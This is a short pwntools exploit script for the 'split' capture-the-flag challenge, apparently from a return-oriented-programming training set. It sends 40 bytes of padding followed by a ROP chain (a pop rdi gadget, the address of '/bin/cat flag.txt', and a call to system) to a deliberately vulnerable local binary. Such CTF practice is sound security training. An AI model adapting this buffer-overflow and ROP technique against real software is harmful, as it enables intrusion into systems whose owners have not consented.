from pwn import *

elf = ELF('./split')

io = elf.process()

pld = b""
pld += b"A" * 40
pld += p64(0x00000000004007c3) # pop rdi ; ret
pld += p64(0x0000000000601060) # /bin/cat flag.txt
pld += p64(0x000000000040074b) # call to system


io.sendlineafter(b"> ", pld)


io.interactive()
